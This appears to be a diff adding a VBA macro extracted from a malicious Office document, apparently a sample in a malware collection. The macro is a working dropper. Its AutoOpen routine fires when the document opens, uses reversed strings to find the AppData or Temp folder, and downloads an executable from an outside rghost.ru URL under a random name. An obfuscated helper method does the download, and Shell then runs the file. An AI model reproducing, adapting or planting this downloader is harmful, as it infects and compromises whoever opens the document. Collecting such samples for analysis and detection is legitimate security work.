@@ -1,0 +1,63 @@
+Filename     : ./macros/b993f242164e6ca498f86c93124786bcf768e003878a416fcb83365578f06cba
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+    
+
+    Dim C As New ESPASPPHLSO
+    Dim B, A, Z As Long
+    Dim U, D, W, O, L, P, N, G As String
+     
+    Private Function T(cb As Integer) As String
+        Randomize
+        W = "abcdefghijklmnopqrstuvwxyz"
+        W = W & UCase(W)
+     
+        Dim i As Long
+        For i = 1 To cb
+            T = T & Mid$(W, Int(Rnd() * Len(W) + 1), 1)
+        Next
+    End Function
+     
+    Private Function R(sFullPath As String) As Boolean
+        Dim Q As Object
+        Set Q = CreateObject("Scripting.FileSystemObject")
+        R = Q.FolderExists(sFullPath)
+    End Function
+     
+    Sub S()
+        O = Array("ataDppA", "PMET")
+       
+        For i = 0 To UBound(O)
+            N = StrReverse(O(i))
+            If R(Environ(N)) Then
+                L = Environ(N) & "\"
+                Exit For
+            End If
+        Next
+       
+        P = T(8)
+    End Sub
+     
+    Sub AutoOpen()
+    On Error GoTo y
+        Call S
+        A = 0
+        Z = vbNormalFocus
+        U = "http://tau.rghost.ru/download/8ZJkz7dzG/4953e3e51c70892a9c79ab639c0933713ece3afb/meg.exe"
+        D = L & P & ".exe"
+        C.Ez1Ams9QcToXumP95P28kK8737IRCoQxRx9T71I7fP7YAotEYImRLgSQMZDjonGtrnF3ftEhFCeR3jv1fu3tzE0rTJVDyd A, U, D
+        B = Shell(D, Z)
+y:
+    End
+    End Sub
+
+
